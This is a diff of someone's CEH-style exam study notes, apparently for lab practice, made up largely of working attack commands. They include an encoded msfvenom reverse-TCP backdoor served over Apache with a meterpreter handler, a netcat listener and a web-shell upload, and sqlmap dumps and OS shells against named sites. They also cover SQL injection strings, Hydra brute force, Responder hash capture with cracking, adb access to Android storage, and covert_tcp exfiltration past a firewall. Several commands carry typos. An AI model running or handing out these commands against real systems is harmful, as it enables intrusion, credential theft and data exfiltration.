@@ -16,20 +16,24 @@ Use AD explorer ( https://download.sysinternals.com/files/AdExplorer.zip )
 
 OR
 > net user
-> net localuser
+> net user [USER_NAME]
+
 
 To decrypt DES(ECB) use::
 ------------------------
 Cyberchef ( https://gchq.github.io/CyberChef/ ) or Cryptool ( https://www.cryptool.org/en/ )
 
+
+
 To perform steganalysis on the txt file::
 ------------------------------------------
 Snow Link: http://www.darkside.com.au/snow/snwdos32.zip
 
-snow -C -p "password" snow_example_encrypted.txt
-
+snow -C -p <password> snow_example_encrypted.txt
 OR 
 use CryptoForge ( https://www.cryptoforge.com/download/CryptoForge.exe )
+
+
 
 To perform WPScan::
 -------------------
@@ -52,7 +56,9 @@ Use burpsuite
 Status=302 length 1131
 
 
+DVWA Hash.txt MD5
 -------------------
+
 | hostname
 | whoami
 | user, group, and privileges
@@ -90,11 +96,13 @@ Nc -nvlp 4444
 |cp /var/www/dvwa/hackable/uploads/hack.jpg /var/www/dvwa/hackable/uploads/hack2.php
 
 
-
+snmp enumeration--
+----------------------------------------------------
 nmap --script vuln 192.168.31.1
 nmap -p 445 -A 192.168.1.101
 nmap --script smb-vuln* -p 445 IP
 nmap --script smb-os-discovery.nse -p 445 IP
+
 
 
 nmap -sU -p 161 --script=snmp-brute 10.10.10.12
@@ -126,3 +134,237 @@ files > export > HTTP objects list
 To find the hash of the file us
 HashMyFiles
 
+
+
+
+-----------------------------------
+
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.11 -f exe > Desktop/Backdoor.exe
+mkdir /var/www/html/share
+service apache2 start
+cp /root/Desktop/Backdoor.exe /var/www/html/share/
+Msfconsole
+use multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost 192.168.92.131
+set lport 4444
+exploit -j -z
+sessions -i 1
+
+
+
+------------------------------
+Image steganography and find pin number from an image file(OpenStego)
+
+Packet capture and find out the C&C callback. Which port and the trojan version? (Wireshark) / U need to find trojan and need to provide the port of the trojan
+http.request.method == “GET”
+Analyze → Follow TCP Stream
+U need to check the traffic from which port to which port is moving using / Analyze the packet and find out which two port are communicating with each other wireshark
+
+
+Type tcp to filter
+U need to check bit 3 is true or not using (Analyze packet with Wireshark and find Modbus 3rd bit is true or false) wireshark
+
+From responder folder find the hash and decrypt it(hashcat)
+U need to crack hash file using john ( the hash file is located in the responder tool logs file) Crack the md5 hash form Documents folder (using john)
+
+
+
+
+responder -I eth0
+Responder will stores the logs in usr/share/responder/logs
+john /usr/share/responder/logs/<file name of the logs.txt>
+https://github.com/HashPals/Search-That-Hash
+sudo apt-get install python3-pip
+git clone https://github.com/HashPals/Search-That-Hash
+pip3 install search-that-hash && sth
+sth -f hash.txt
+
+
+
+--------------------------------------------------
+
+hydra -l samson -P /usr/share/wordlists/rockyou.txt 192.168.1.101 ftp
+Namap then hydra
+nmap -p 21 [IP Address of Windows 10]
+hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Passwords.txt ftp://[IP Address of Windows 10]
+
+
+
+--------------------------------
+
+
+
+
+-------------------------------------
+
+Find user A password from existing database of moviescope.com database (SQL Injection in username and password parameter) / Sql injection using sqlmap: u need to perform sql injection attack using sqlmap and need to extract password of specific user.
+
+
+click Console tab and type document.cookie
+sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie
+value which you have copied in step #5”> --dbs
+sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie value
+which you have copied in step #5”> -D moviescope --tables
+sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --
+cookie=<”cookie value which you have copied in step #5”> -D moviescope -T User_Login --dump
+For OS shell
+sqlmap -u
+“http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie value which you
+have copied in step #5”> --os-shell
+hostname / ipconfig
+
+
+URL = http://testphp.vulnweb.com/artists.php?artist=1
+Find DBs = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch
+Result is DB name acuart
+Find Tables = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables --batch
+Result is table name users
+Find columns = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch
+Dump table = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch
+Dump the DB = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --dump-all --batch
+Reference = https://www.hackingarticles.in/database-penetration-testing-using-sqlmap-part-1/
+Using cookies
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --cookie='JSESSIONID=09h76qoWC559GH1K7DSQHx' --random-agent --level=1 --risk=3 --dbs --batch
+SQL Injection
+in login page enter blah' or 1=1-- as username and click login without entering the password
+OS Shell = sqlmap -u 'url' --dbms=mysql --os-shell
+SQL Shell = sqlmap -u 'url' --dbms=mysql --sql-shell
+
+
+Find the phone number of a user of moviscope.com (Open-redirect)
+U need to perform the parameter tampering
+
+
+----------------------------------
+
+python3 dsss.py
+python3 dsss.py -u "http://www.moviesc,ope.com/viewprofile.aspx?id=1" --cookie="<cookie value which you have copied in Step 17>"
+
+
+-------------------------------------
+
+blah' or 1=1 --
+blah';insert into login values ('john','apple123'); --
+blah';create database mydatabase; --
+
+----------------------------------------
+
+Use Hashcalc
+Md5calc
+
+-------------------------
+
+Extract the information from the SDcard of the Android User?
+-------------------------------------------------------------
+adb connect ip:5555
+adb devices -l
+adb shell
+cd SDcard then
+cd Downloads,
+cat flag etc
+
+
+Python3 phonesploit.py
+>3 >4>pwd>ls> cd SDcard> cd Downloads> cat flag
+
+
+---------------------------------
+
+Send data to another Machine (firewall blocked) ?
+
+
+Parrot Machine
+Type cd Desktop and press Enter.
+Type mkdir send and press Enter.
+Type cd send/ and press Enter.
+Type echo "Secret Message" > message.txt and press Enter
+type cc -o covert_tcp covert_tcp.c and press Enter.
+
+Ubuntu Machine
+Type cd Desktop and press Enter.
+Type mkdir receive and press Enter.
+Type cd receive and press Enter.
+Tcpdump -nvvx port 8888 -i lo
+type smb://10.10.10.16 in the Server Address field and press Ent
+type cc -o covert_tcp covert_tcp.c and press Enter.
+To start a listener, type ./covert_tcp –dest 10.10.10.9 –source 10.10.10.11 –source_port 9999–dest_port 8888 –server –file /home/ubuntu/Desktop/receive/receive.txt and press Enter.
+
+Parrot Machine
+In the terminal window type ./covert_tcp –dest 10.10.10.9 –source 10.10.10.11 -source_port 8888 –
+dest_port 9999 –file /root/Desktop/send/message.txt and press Enter to start sending the contents of
+message.txt file through covert_tcp.
+
+
+----------------------------------------------
+
+https://github.com/Yshmehtaa/CEHV11/tree/main/CEH.ctb_TXT
+https://github.com/cmuppin/CEH
+https://medium.com/techiepedia/certified-ethical-hacker-practical-exam-guide-dce1f4f216c9
+https://github.com/nirangadh/ceh-practical
+https://book.thegurusec.com/certifications/certified-ethical-hacker-practical/scanning-networks
+https://docs.google.com/spreadsheets/d/e/2PACX-1vQWdEEN1oBeSKGjiCO0j6YUjouflX4yAxH7tsp7_vJzmOnNhYtFMEUveYmmoOAfd8MT1wayOYWimTI6/pubhtml
+
+https://hashcat.net/wiki/doku.php?id=example_hashes
+
+
+
+
+hashid -m "\$2y\$12\$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom"
+sudo hashcat -m 3200 "\$2y\$12\$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom" /usr/share/wordlists/rockyou.txt
+hashid -m "\$6\$aReallyHardSalt\$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02."
+hashcat -m 1800 "\$6\$aReallyHardSalt\$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02." /usr/share/wordlists/rockyou.txt
+hashid -m e5d8870e5bdd26602cab8dbe07a942c8669e56d6
+hashcat -m 160 e5d8870e5bdd26602cab8dbe07a942c8669e56d6:tryhackme /usr/share/wordlists/rockyou.txt
+hashcat -m 1800 -a 0 "\$6\$aReallyHardSalt\$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02." /usr/share/wordlists/rockyou.txt
+
+
+
+
+Search-That-Hash
+
+https://github.com/HashPals/Search-That-Hash
+sudo apt-get install python3-pip
+git clone https://github.com/HashPals/Search-That-Hash
+pip3 install search-that-hash && sth
+sth -f hash.txt
+hashcat -m 150 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --show
+
+
+
+Using John the Ripper
+
+/usr/sbin/john –test
+myuser:AZl.zWwxIh15Q
+/usr/sbin/john password.txt
+/usr/sbin/john password.txt –show
+sudo john --format=sha256crypt --wordlist=/usr/share/wordlists/rockyou.txt password.txt
+cat john,pot
+
+
+
+
+crack the Zip file password
+
+cp secure.zip ~/toos/john/run/
+zip2john secure.zip > ziphashes
+cat ziphashes
+sudo john -w=/usr/share/wordlists/rockyou.txt ziphashes
+
+
+
+crack the rar file password
+
+cp secure.rar ~/toos/john/run/
+rar2john secure.zip > rarhashes
+cat rarhashes
+sudo john -w=/usr/share/wordlists/rockyou.txt rarhashes
+
+
+
+crack the RSA file password
+
+cp secure.rar ~/toos/john/run/
+python2 /usr/share/john/ssh2john.py rsa >pvtekeyhashes
+cat pvtekeyhashes
+sudo john -w=/usr/share/wordlists/rockyou.txt pvtekeyhashes
